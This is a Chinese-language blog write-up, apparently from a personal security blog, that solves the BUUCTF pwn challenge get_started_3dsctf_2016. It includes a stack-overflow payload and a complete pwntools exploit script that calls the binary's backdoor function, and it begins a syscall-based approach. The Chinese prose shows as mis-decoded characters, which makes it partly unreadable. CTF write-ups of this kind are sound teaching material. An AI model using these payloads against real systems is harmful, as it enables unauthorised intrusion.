<!DOCTYPE html>
<html
  lang="zh"
  dir="ltr"
  
><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>ã€syscallã€‘get_started_3dsctf_2016 - P3troL1erçš„ä¸ªäººåšå®¢</title>

<meta name="generator" content="Hugo Eureka 0.9.3" />
<link rel="stylesheet" href="https://peterliuzhi.top/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
<script defer src="https://peterliuzhi.top/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js"></script>













<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="preload"
  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto&#43;Serif&#43;SC:wght@400;600;700&amp;display=swap"
  as="style" onload="this.onload=null;this.rel='stylesheet'">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css"
   media="print"
  onload="this.media='all';this.onload=null" crossorigin>
<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js"
   crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/c.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/cpp.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/armasm.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/x86asm.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/mipsasm.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/vim.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/java.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/javascript.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/typescript.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/go.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/php.min.js"
     crossorigin></script>
  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/css.min.js"
     crossorigin></script>
<link rel="stylesheet" href="https://peterliuzhi.top/css/highlightjs.min.0e3b6ac4177cdecae52d1b2de76aa7a0ce8a92e4cc23ef2f8691f0218a25f5d328e14bf47be023009535efe940980954.css" media="print" onload="this.media='all';this.onload=null">



<script src="https://kit.fontawesome.com/99649a0b4d.js" crossorigin="anonymous"></script>



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"
   integrity="sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ"  media="print"
  onload="this.media='all';this.onload=null" crossorigin>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js" 
  integrity="sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY"  crossorigin></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js"
   integrity="sha384-&#43;XBljXPPiv&#43;OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR"  crossorigin></script>
<script>
  document.addEventListener("DOMContentLoaded", function () {
    renderMathInElement(document.body, {
      delimiters: [
        { left: "$$", right: "$$", display: true },
        { left: "$", right: "$", display: false },
        { left: "\\(", right: "\\)", display: false },
        { left: "\\[", right: "\\]", display: true }
      ],
    });
  });
</script>


<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js" 
  integrity="sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0"  crossorigin></script>
<link rel="preconnect" href="https://www.google-analytics.com" crossorigin>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C6MXT4N6J6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag() { dataLayer.push(arguments); }
  gtag('js', new Date());
  gtag('config', 'G-C6MXT4N6J6');
</script>




<link rel="icon" type="image/png" sizes="32x32" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_32x32_fill_q75_box_center.jpg">
<link rel="apple-touch-icon" sizes="180x180" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_180x180_fill_q75_box_center.jpg">

<meta name="description"
  content="BUUCTF get_started_3dsctf_2016çš„è§£æ">
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
      "@type": "ListItem",
      "position": 1 ,
      "name":"Writeups",
      "item":"https://peterliuzhi.top/writeup/"},{
      "@type": "ListItem",
      "position": 2 ,
      "name":"ã€syscallã€‘get_started_3dsctf_2016",
      "item":"https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/"}]
}
</script>



<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/"
    },
    "headline": "ã€syscallã€‘get_started_3dsctf_2016 - P3troL1erçš„ä¸ªäººåšå®¢","datePublished": "2022-12-29T03:01:44+08:00",
    "dateModified": "2022-12-29T03:01:44+08:00",
    "wordCount":  2828 ,
    "publisher": {
        "@type": "Person",
        "name": "Peter Liu",
        "logo": {
            "@type": "ImageObject",
            "url": "https://peterliuzhi.top/images/selficon.jpg"
        }
        },
    "description": "BUUCTF get_started_3dsctf_2016çš„è§£æ"
}
</script><meta property="og:title" content="ã€syscallã€‘get_started_3dsctf_2016 - P3troL1erçš„ä¸ªäººåšå®¢" />
<meta property="og:type" content="article" />


<meta property="og:image" content="https://peterliuzhi.top/images/selficon.jpg">


<meta property="og:url" content="https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/" />



<meta property="og:description" content="BUUCTF get_started_3dsctf_2016çš„è§£æ" />



<meta property="og:locale" content="zh" />




<meta property="og:site_name" content="P3troL1erçš„ä¸ªäººåšå®¢" />






<meta property="article:published_time" content="2022-12-29T03:01:44&#43;08:00" />


<meta property="article:modified_time" content="2022-12-29T03:01:44&#43;08:00" />



<meta property="article:section" content="writeup" />


<meta property="article:tag" content="pwn" />

<meta property="article:tag" content="syscall" />





<meta property="og:see_also" content="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" />

<meta property="og:see_also" content="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" />

<meta property="og:see_also" content="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" />

<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" />

<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" />

<meta property="og:see_also" content="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" />




  <body class="flex min-h-screen flex-col">
    <header
      class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"
    >
      <div class="mx-auto w-full max-w-screen-xl"><style>
.search-container {
  margin-top: -0.3rem;
  margin-right: 1rem;
}
.search-container .search {
  border: 1px solid #e2e8f0;
  border-radius: 4px;
}
.search-container input {
  padding-left: 1rem;
  line-height: 2rem;
  outline: none;
  background: transparent;
}
.search-container button {
  font-size: 0.8rem;
  margin-right: 0.5rem;
  color: #e2e8f0;
}
</style>
<script>
    let storageColorScheme = localStorage.getItem("lightDarkMode")
    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
        document.getElementsByTagName('html')[0].classList.add('dark')
    }
</script>
<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
    <a href="/" class="me-6 text-primary-text text-xl font-bold">P3troL1erçš„ä¸ªäººåšå®¢</a>
    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
        <i class="fas fa-bars"></i>
    </button>

    <div id="target"
        class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
        <div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0">
            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">About</a>
            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Posts</a>
            <a href="/writeup/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  me-4">WriteUp</a>
            <a href="/tricks/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Tricks</a>
            <a href="/archive/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Archive</a>
            <a href="/stats/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Statistics</a>
        </div>

        <div class="flex">
            <div class="search-container relative pt-4 md:pt-0">
                <div class="search">
                    <form role="search" class="search-form" action="/search.html" method="get">
                    <label>
                        <input name="q" type="text" placeholder="æœç´¢ ..." class="search-field">
                    </label>
                    <button>
                        <i class="fa-solid fa-magnifying-glass"></i>
                    </button>
                    </form>
                </div>
            </div>

        <div class="flex">
            <div class="relative pt-4 md:pt-0">
                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
                    <i class="fas fa-adjust"></i>
                </div>
                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
                </div>
                <div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
                    id='lightDarkOptions'>
                    <span class="px-4 py-1 hover:text-eureka" name="Light">æµ…è‰²</span>
                    <span class="px-4 py-1 hover:text-eureka" name="Dark">æ·±è‰²</span>
                    <span class="px-4 py-1 hover:text-eureka" name="Auto">è‡ªåŠ¨</span>
                </div>
            </div>
        </div>
    </div>

    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
    </div>

</nav>
<script>
    
    let element = document.getElementById('lightDarkMode')
    if (storageColorScheme == null || storageColorScheme == 'Auto') {
        document.addEventListener('DOMContentLoaded', () => {
            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
        })
    } else if (storageColorScheme == "Light") {
        element.firstElementChild.classList.remove('fa-adjust')
        element.firstElementChild.setAttribute("data-icon", 'sun')
        element.firstElementChild.classList.add('fa-sun')
    } else if (storageColorScheme == "Dark") {
        element.firstElementChild.classList.remove('fa-adjust')
        element.firstElementChild.setAttribute("data-icon", 'moon')
        element.firstElementChild.classList.add('fa-moon')
    }

    document.addEventListener('DOMContentLoaded', () => {
        getcolorscheme();
        switchBurger();
    });
</script>
</div>
    </header>
    <main class="grow pt-16">
        <div class="pl-scrollbar">
          <div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8">
  
  
  <div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12">
    <div
      class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
    >
      <article class="prose">
  <h1 class="mb-4">ã€syscallã€‘get_started_3dsctf_2016</h1>

  <div
  class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
>
  <div class="me-6 my-2">
    <i class="fas fa-calendar me-1"></i>
    <span
      >Thursday, December 29, 2022</span
    >
  </div>
  <div class="me-6 my-2">
    <i class="fas fa-clock me-1"></i>
    <span>6åˆ†é’Ÿé˜…è¯»æ—¶é•¿</span>
  </div>

  
    <div class="me-6 my-2">
      <i class="fas fa-folder me-1"></i>
      
        <a href="https://peterliuzhi.top/categories/writeup/" class="hover:text-eureka"
          >writeup</a
        >
      
    </div>
  

    
    <div class="me-6 my-2">
      <i class="fa-solid fa-tag"></i>
      
        <a href="https://peterliuzhi.top/tags/pwn/" class="hover:text-eureka"
          >pwn</a
        >
      
        
          <span>, </span>
        <a href="https://peterliuzhi.top/tags/syscall/" class="hover:text-eureka"
          >syscall</a
        >
      
    </div>
  

  
</div>


  
  

  <blockquote>
<p>We are shaped by our thoughts; we become what we think. When the mind is pure, joy follows like a shadow that never leaves.
â€” <cite>Buddha</cite></p>
</blockquote>
<p><a href="https://buuoj.cn/challenges#get_started_3dsctf_2016">åŸé¢˜é“¾æ¥</a></p>
<blockquote>
<p>åœ¨åšé¢˜å‰ï¼Œæˆ‘å…ˆä¸ºå…¶å»ºç«‹äº†ä¸€ä¸ªä¸“é—¨çš„å·¥ä½œç›®å½•ï¼š
<img src="/image/202209062206042022-09-06-22-06-04.png" alt="202209062206042022-09-06-22-06-04"></p>
</blockquote>
<ul>
<li><a href="#syscallwrite-upbuuctf-get_started_3dsctf_2016">ã€syscallã€‘ã€Write-upã€‘BUUCTF Get_started_3dsctf_2016</a>
<ul>
<li><a href="#checksec-%E6%9F%A5%E7%9C%8B%E6%9E%B6%E6%9E%84">checksec æŸ¥çœ‹æ¶æ„</a></li>
<li><a href="#ida-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E4%BC%AA%E4%BB%A3%E7%A0%81">ida æŸ¥çœ‹ç¨‹åºï¼ˆä¼ªï¼‰ä»£ç </a>
<ul>
<li><a href="#main-%E5%87%BD%E6%95%B0">main å‡½æ•°</a></li>
<li><a href="#%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0">åé—¨å‡½æ•°</a></li>
</ul>
</li>
<li><a href="#%E6%9E%84%E5%BB%BA-exp">æ„å»º exp</a>
<ul>
<li><a href="#%E9%80%9A%E8%BF%87%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E6%9E%84%E5%BB%BA-exp">é€šè¿‡åé—¨å‡½æ•°æ„å»º exp</a>
<ul>
<li><a href="#%E5%AE%8C%E6%95%B4-exp1">å®Œæ•´ exp1</a></li>
</ul>
</li>
<li><a href="#%E9%80%9A%E8%BF%87-syscall-%E6%9E%84%E5%BB%BA-exp">é€šè¿‡ syscall æ„å»º exp</a>
<ul>
<li><a href="#%E6%B2%A1%E6%9C%89%E7%8E%B0%E6%88%90binsh%E6%9E%84%E5%BB%BA%E5%AD%97%E7%AC%A6%E4%B8%B2">æ²¡æœ‰ç°æˆ<code>&quot;/bin/sh&quot;</code>ï¼šæ„å»ºå­—ç¬¦ä¸²</a></li>
<li><a href="#%E5%AE%8C%E6%95%B4-exp2">å®Œæ•´ exp2</a></li>
<li><a href="#%E4%B8%80%E4%BA%9B%E6%82%AC%E8%80%8C%E6%9C%AA%E5%86%B3%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98">ä¸€äº›æ‚¬è€Œæœªå†³çš„å°é—®é¢˜</a>
<ul>
<li><a href="#%E4%BD%9C%E8%80%85%E8%AF%95%E5%9B%BE%E4%B8%8D%E4%BD%BF%E7%94%A8pop-edxpop-ecxpop-ebxret%E5%8F%AA%E4%BD%BF%E7%94%A8pop-edxret">ä½œè€…è¯•å›¾ä¸ä½¿ç”¨<code>pop edx;pop ecx;pop ebx;ret</code>åªä½¿ç”¨<code>pop edx;ret</code></a></li>
<li><a href="#%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%85%B6%E4%BB%96%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6">æ— æ³•æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="checksec-æŸ¥çœ‹æ¶æ„">checksec æŸ¥çœ‹æ¶æ„</h2>
<p><img src="/image/202209062207232022-09-06-22-07-23.png" alt="202209062207232022-09-06-22-07-23"></p>
<p>çœ‹æ¥æ˜¯ 32 ä½çš„ç¨‹åºã€‚æˆ‘ä»¬é¦–å…ˆå°±è¦æƒ³åˆ°ï¼Œ32 ä½ç¨‹åºçš„å‚æ•°ä¼ é€’æ–¹å¼å’Œ 64 ä½ç¨‹åºçš„æ˜¯ä¸ä¸€æ ·çš„ï¼š</p>
<ul>
<li>32 ä½å°†å‚æ•°ä»å³åˆ°å·¦å…ˆåå‹å…¥æ ˆä¸­</li>
<li>64 ä½ç¨‹åºå°†å‚æ•°åˆ†åˆ«ç”¨ RDI,RSI,RCX,RDX,R8,R9 ä½œä¸ºç¬¬ 1-6 ä¸ªå‚æ•°ï¼Œç”¨ RAX ä¿å­˜è¿”å›å€¼</li>
</ul>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬è°ƒç”¨ system å‡½æ•°çš„æ€è·¯å°±ä¸ä¸€æ ·äº†ã€‚æˆ‘ä»¬å°±ä¸éœ€è¦ pop rdi;ret è¿™ä¸ª gadgetï¼ˆåœ¨ 32 ä½ç¨‹åºä¸­ä¹Ÿæ‰¾ä¸åˆ°ï¼‰ï¼Œè€Œæ˜¯åªéœ€è¦æ³¨æ„ç”¨ ret è¿™ä¸ª gadget ä¿æŒæ ˆè¿”å›æ—¶æœ€åä¸€ä½ä¸º 0 å³å¯ï¼ˆsystem ç‰¹æ®Šè§„å®šï¼‰ï¼Œ<a href="https://blog.csdn.net/qq_29328443/article/details/107232025">å¯ä»¥å‚è€ƒè¿™é‡Œ</a></p>
<p>ä½†æ˜¯å¦‚æœç¨‹åºå¾ˆå¥½å¿ƒåœ°ä¸ºæˆ‘ä»¬æä¾›äº†åé—¨å‡½æ•°ï¼Œé‚£ä¸Šé¢çš„è¿™äº›ä¹Ÿä¸ç”¨è€ƒè™‘äº†</p>
<p>åŒæ—¶ï¼Œæˆ‘ä»¬è¦æ³¨æ„ 32 ä½ç¨‹åºç”±äºå‚æ•°ä¿å­˜åœ¨æ ˆä¸­ï¼Œcall çš„åŒæ—¶è¿˜ä¼šå°†ã€ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åç§»ã€‘å‹å…¥æ ˆä¸­ï¼Œå› æ­¤æˆ‘ä»¬è¦ä¸ºã€ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åç§»ã€‘é¢„ç•™å‡ºä½ç½®</p>
<h2 id="ida-æŸ¥çœ‹ç¨‹åºä¼ªä»£ç ">ida æŸ¥çœ‹ç¨‹åºï¼ˆä¼ªï¼‰ä»£ç </h2>
<h3 id="main-å‡½æ•°">main å‡½æ•°</h3>
<p><img src="/image/202209062217032022-09-06-22-17-04.png" alt="202209062217032022-09-06-22-17-04"></p>
<p>çœ‹æ¥æ˜¯ç®€å•çš„æ ˆæº¢å‡º</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œå³ printf å’Œ puts çš„åŒºåˆ«ã€‚</p>
<p>printf åœ¨è°ƒç”¨å®Œåå¹¶ä¸ä¼šé©¬ä¸Šæ‰“å°å‡ºå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ç­‰å¾…åˆ·æ–°ç¼“å†²åŒºçš„æŒ‡ä»¤ä¹‹åæ‰æ˜¾ç¤ºå­—ç¬¦ä¸²ã€‚åœ¨è¿™é‡Œå°±ä½“ç°ä¸ºï¼Œåˆ° gets å‡½æ•°å‘ç”¨æˆ·è¯·æ±‚è¾“å…¥æ—¶ï¼Œè¿˜æ²¡æœ‰ä»»ä½•å­—ç¬¦ä¸²æ˜¾ç¤ºã€‚</p>
<p>å› æ­¤ï¼Œå¯èƒ½æœ‰äººä¼šåœ¨å†™ exp çš„æ—¶å€™ï¼Œä¸€ç›´ç­‰å¾…å­—ç¬¦ä¸²è¾“å‡ºï¼Œçœ‹ä¸€ç›´æ²¡ååº”è¿˜ä»¥ä¸ºè‡ªå·± payload å†™é”™äº†ï¼ˆ</p>
<p>å…·ä½“çš„ printf å’Œ puts çš„åŒºåˆ«å¯ä»¥çœ‹<a href="https://www.cnblogs.com/fanzhidongyzby/p/3519838.html">è¿™ä½å¤§ä½¬çš„åšæ–‡</a>ï¼Œéå¸¸è¯¦ç»†</p>
<h3 id="åé—¨å‡½æ•°">åé—¨å‡½æ•°</h3>
<p><img src="/image/202209062232592022-09-06-22-32-59.png" alt="202209062232592022-09-06-22-32-59"></p>
<p>ç„¶åæˆ‘ä»¬å°±å‘ç°äº†ç¨‹åºå¥½å¿ƒä¸ºæˆ‘ä»¬æä¾›çš„åé—¨å‡½æ•°ï¼ˆ</p>
<p>åªè¦æˆ‘ä»¬ä¼ å…¥å‚æ•°åˆ†åˆ«ä¸º 814536271 å’Œ 425138641ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¾—åˆ° flag çš„å†…å®¹</p>
<h2 id="æ„å»º-exp">æ„å»º exp</h2>
<h3 id="é€šè¿‡åé—¨å‡½æ•°æ„å»º-exp">é€šè¿‡åé—¨å‡½æ•°æ„å»º exp</h3>
<p>æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>é¦–å…ˆæˆ‘ä»¬è¦æ‰¾åˆ° offset æº¢å‡ºåˆ° return çš„æ ˆåœ°å€ï¼Œè¿™é€šè¿‡ ida å¾ˆå®¹æ˜“å‘ç°<img src="/image/202209062236332022-09-06-22-36-34.png" alt="202209062236332022-09-06-22-36-34"></li>
<li>ç„¶åæˆ‘ä»¬å°±å°†åé—¨å‡½æ•°åœ°å€å’Œå‚æ•°å€¼å¡«å…¥æ ˆä¸­å³å¯</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># pg = p32</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mh">0x80489a0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">814536271</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">425138641</span><span class="p">)</span>
</span></span></code></pre></div><p>ç„¶åç›´æ¥ sendline å°± ğŸ†— å•¦</p>
<h4 id="å®Œæ•´-exp1">å®Œæ•´ exp1</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./get_started_3dsctf_2016&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_name</span><span class="p">:</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;25191&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mh">0x80489a0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">814536271</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">425138641</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="é€šè¿‡-syscall-æ„å»º-exp">é€šè¿‡ syscall æ„å»º exp</h3>
<p>æˆ‘ä»¬é€šè¿‡ ida å¯ä»¥å¾—çŸ¥ï¼Œè¯¥ç¨‹åº plt è¡¨å†…æ²¡æœ‰ system å‡½æ•°ä¹Ÿæ²¡æœ‰ execve å‡½æ•°ï¼ŒåŒæ—¶æ­¤é¢˜åˆæ˜¯é™æ€ç¼–è¯‘ï¼Œå°±ä¸èƒ½é€‚ç”¨ ret2libc çš„æ–¹æ³•ä» libc ä¸­æ‰¾åˆ° systemã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºä¸­æ–­æ—¶äº§ç”Ÿçš„ç³»ç»Ÿè°ƒç”¨æ¥æ‰§è¡Œ execve è¿™ä¸ªä¸­æ–­ç¨‹åº</p>
<p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">å…¨éƒ¨ä¸­æ–­ç¨‹åºç¼–å·è§æ­¤</a></p>
<p>è¿™é‡Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ° 59 å·ä¸­æ–­ç¨‹åºï¼Œå‘å®ƒä¼ å‚å³å¯</p>
<p>64 ä½ç¼–å·æ˜¯ 59ï¼Œä¹Ÿå°±æ˜¯ 0x3b</p>
<p><img src="/image/202209062254342022-09-06-22-54-35.png" alt="202209062254342022-09-06-22-54-35"></p>
<p>32 ä½ç¼–å·æ˜¯ 11ï¼Œä¹Ÿå°±æ˜¯ 0xbã€‚</p>
<p><img src="/image/202209062255302022-09-06-22-55-30.png" alt="202209062255302022-09-06-22-55-30"></p>
<p>åŒæ—¶ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¨‹åºæ˜¯ 32 ä½çš„ï¼Œæˆ‘ä»¬éœ€è¦å°†ç¼–å·ä¼ ç»™ eax å¯„å­˜å™¨ï¼Œå‰©ä½™å‚æ•°åˆ†åˆ«ä¼ å…¥ ecx,edx,esi,edi,ebp ä¸­</p>
<p><img src="/image/202209062259352022-09-06-22-59-35.png" alt="202209062259352022-09-06-22-59-35"></p>
